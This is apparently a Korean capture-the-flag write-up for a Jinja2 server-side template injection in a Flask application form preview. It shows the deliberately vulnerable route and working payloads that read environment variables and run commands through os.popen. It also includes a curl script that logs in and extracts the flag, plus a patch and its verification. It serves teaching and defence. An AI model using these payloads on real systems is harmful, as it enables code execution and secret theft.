# medium-04 mirror — 서버사이드 템플릿 인젝션 (SSTI)

> 출제: B조 (수하, 종성) · 분류: Web · 난이도: Medium

---

## 1. 문제 개요

| 항목 | 내용 |
|---|---|
| 분류 | Web |
| 난이도 | Medium |
| 접속 | `http://<출제조IP>:8006` |
| 인증 | 회원가입 후 로그인 (미리보기는 로그인 필요) |
| 플래그 형식 | `GlassHouse{...}` |
| 최종 목표 | 신청서 미리보기 기능의 SSTI를 이용해, 파일이 아닌 환경변수(`FLAG_MIRROR`) 에 담긴 플래그를 읽어낸다 |

신청 사연의 줄바꿈이 깨진다는 민원 때문에, 사무국이 신청서 작성 화면에 미리보기 버튼을 달았다. 제출 전에 내 사연이 어떻게 보일지 바로 확인해 준다. 그런데 이 "바로 보여주는" 방식에 문제가 있다. 또한 설명에 따르면 중요한 값은 파일로 남기지 않고 서버가 켜질 때만 건네받아 쓴다 — 즉 플래그는 환경변수에 들어 있다.

---

## 2. 의도한 풀이 과정

1. 입력이 출력에 반영되는 지점을 찾는다. 미리보기는 내가 쓴 사연을 화면에 그대로 보여 준다. 입력이 출력에 섞이는 기능은 항상 1순위 점검 대상이다. 여기서 던질 질문은 하나 — "내 입력이 *글자 그대로* 나오나, 아니면 서버가 *해석*하나?"

2. 해석되는지 확인한다. 사연 칸에 `{{ 7*7 }}` 를 넣고 미리보기를 누른다. 화면에 `{{ 7*7 }}` 가 아니라 `49` 가 나오면, 서버가 내 입력을 템플릿으로 컴파일·실행하고 있다는 뜻이다. 이것이 SSTI(Server-Side Template Injection) 다.

3. 무엇을 읽을지 정한다. 문제 설명의 "중요한 값을 파일로 안 남기고 서버 켤 때만 건네받는다" 는 플래그가 환경변수에 있다는 단서다. (그래서 Flask 설정을 덤프하는 `{{ config }}` 로는 안 나온다 — 이 앱은 플래그를 `app.config` 에 넣지 않는다. 오직 프로세스 환경에만 있다.)

4. 환경변수까지 손을 뻗는다. Jinja 표현식 안에서는 파이썬 객체를 타고 `os` 모듈에 닿을 수 있다. 템플릿 전역에 늘 존재하는 `lipsum` 을 징검다리 삼아 `lipsum.__globals__.os.environ` 으로 환경변수에 접근하고, 거기서 `FLAG_MIRROR` 를 꺼낸다.

---

## 3. 취약점의 원인과 성립 조건

### 취약한 코드

`routes/apply.py` 의 미리보기 라우트가 전부다.

```python
@bp.post("/apply/preview")
def preview():
    user = data.find_user_by_id(session.get("user_id"))
    if user is None:
        return redirect(url_for("auth.login"))

    intro = request.form.get("intro", "")

    html = (
        "<div class='container'>"
        "<h2>신청 사연 미리보기</h2>"
        "<div class='preview'>" + intro + "</div>"      # ← 사용자 입력을 템플릿 "소스" 에 결합
        "<p><a href='/apply'>← 신청서 작성으로</a></p>"
        "</div>"
    )
    return render_template_string(html)                  # ← 그 소스를 템플릿으로 렌더
```

### 왜 뚫리는가 — 원인

`render_template_string()` 은 넘겨받은 문자열을 Jinja2 템플릿으로 컴파일해서 실행하는 함수다. 원래 "템플릿" 은 개발자가 짜는 코드이고, 사용자 입력은 그 안에 데이터로만 들어가야 한다. 그런데 이 코드는 사용자가 쓴 `intro` 를 템플릿 문자열 자체에 이어 붙였다. 그 결과 `intro` 안에 들어 있는 `{{ ... }}`(표현식)나 `{% ... %}`(구문)가 서버에서 그대로 실행된다.

Jinja 표현식은 단순 계산(`{{7*7}}`)에 그치지 않는다. 파이썬 객체의 속성을 타고 올라가면 모듈·내장함수에 닿을 수 있어, 환경변수 읽기나 명령 실행까지 확장된다. 그래서 SSTI는 보통 원격 코드 실행(RCE) 급으로 취급된다. (이 문제의 `docker-compose.yml` 이 컨테이너를 `read_only` 로 잠근 것도 "명령 실행이 되는 문제" 라서다.)

### 성립 조건 정리

- 사용자 입력(`intro`)이 템플릿 "소스" 문자열에 결합된다(문자열 `+`).
- 그 문자열을 `render_template_string` 으로 렌더한다 — 즉 입력이 코드로 평가된다.
- 미리보기는 로그인만 하면 쓸 수 있고(회원가입으로 계정 생성 가능), 특별한 권한이 필요 없다.
- 플래그가 환경변수(`FLAG_MIRROR`)에 있어, 표현식으로 `os.environ` 에 닿으면 바로 읽힌다.

---

## 4. 풀이 결과

미리보기 영역에 입력한 표현식이 "계산된 값" 으로 나오면 성공이다.

| 입력(사연 칸) | 미리보기 출력 | 의미 |
|---|---|---|
| `{{ 7*7 }}` | `49` | SSTI 성립 확인 |
| `{{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}` | `GlassHouse{...}` | 환경변수의 플래그 노출 |

최종 출력은 다음 형태가 된다. (대괄호 안은 서버 실행 시의 실제 값)

```
GlassHouse{[실제 플래그 값]}
```

> 변수 이름을 모를 때는 `{{ lipsum.__globals__.os.environ }}` 로 환경변수 전체를 덤프하면 그 안에서 `FLAG_MIRROR=GlassHouse{...}` 를 찾을 수 있다. 명령 실행으로 접근하려면 `{{ lipsum.__globals__.os.popen('env').read() }}` 도 같은 결과를 준다.

---

## 5. 패치 방안과 검증

### 왜 기존 방식이 틀렸나

근본 원인은 사용자 입력을 템플릿 "소스" 로 사용한 것이다. 입력에서 `{`, `}` 같은 글자를 지우는 식의 블랙리스트는 우회가 많아 신뢰할 수 없다. 올바른 해법은 입력을 절대 코드로 취급하지 않는 것 — 고정된 템플릿을 두고, 사용자 입력은 데이터(변수)로만 전달하는 것이다.

### 권장 패치 — 템플릿 파일 + 변수 전달 (`render_template`)

핵심은 `render_template_string` 이냐 `render_template` 이냐가 아니라, 사용자 입력을 템플릿 "소스" 가 아니라 "데이터(변수)" 로 넘기느냐 다. 가장 깔끔한 방법은 이 앱의 다른 화면들과 똑같이 템플릿 파일을 따로 두고 `render_template` 로 변수만 넘기는 것이다. 그러면 위험한 `render_template_string` 을 아예 쓰지 않게 되어, 같은 실수가 날 여지 자체가 사라진다.

`routes/apply.py`:

```python
@bp.post("/apply/preview")
def preview():
    user = data.find_user_by_id(session.get("user_id"))
    if user is None:
        return redirect(url_for("auth.login"))

    intro = request.form.get("intro", "")
    return render_template("apply/preview.html", intro=intro)
```

새 템플릿 `templates/apply/preview.html`:

```html
{% extends "base.html" %}
{% block title %}신청 사연 미리보기{% endblock %}
{% block content %}
<div class="container">
  <h2>신청 사연 미리보기</h2>
  <div class="preview">{{ intro }}</div>
  <p><a href="/apply">← 신청서 작성으로</a></p>
</div>
{% endblock %}
```

템플릿 파일 안의 `{{ intro }}` 는 intro 의 값을 출력만 할 뿐, 그 안의 표현식을 실행하지 않는다. 또 Flask의 자동 이스케이프(기본 on)가 적용돼, SSTI뿐 아니라 입력에 섞인 HTML/스크립트(저장형 XSS)도 함께 막아 준다.

### 검증 (실측)

같은 입력으로 취약 버전과 패치 버전을 각각 렌더해 비교했다.

| 입력 | 취약(소스 결합) | 패치(변수 전달) |
|---|---|---|
| `{{7*7}}` | `49` (실행됨) | `{{7*7}}` (그대로 출력, 실행 안 됨) |

패치 버전에서는 표현식이 더 이상 평가되지 않으므로 SSTI가 막힌다. 미리보기 기능(사연을 화면에 보여 주는 것)은 그대로 동작한다.


---

## 6. 익스플로잇 코드

### 공격의 본체

회원가입 후 로그인한 상태에서, 신청서 작성(`/apply`)의 신청 사연 칸에 페이로드를 넣고 미리보기를 누르면 된다.

| 목적 | 사연 칸에 넣을 값 |
|---|---|
| SSTI 확인 | `{{ 7*7 }}` → 미리보기에 `49` |
| 플래그 획득 | `{{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}` → 미리보기에 플래그 |

### CLI로 재현 (선택)

로그인 세션 쿠키를 받아 미리보기 요청에 그대로 쓴다.

```bash
B=http://127.0.0.1:8006

# 1) 회원가입 → 로그인(세션 쿠키 저장)
curl -s --data-urlencode "username=hacker01" --data-urlencode "password=pw123456" \
     --data-urlencode "password_confirm=pw123456" --data-urlencode "name=tester" \
     --data-urlencode "email=a@a.com" "$B/signup" >/dev/null
curl -s -c c.txt --data-urlencode "username=hacker01" \
     --data-urlencode "password=pw123456" "$B/login" >/dev/null

# 2) 미리보기에 SSTI 페이로드 전송 → 플래그 추출
curl -s -b c.txt \
     --data-urlencode "intro={{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}" \
     "$B/apply/preview" | grep -o "GlassHouse{[^}]*}"
```
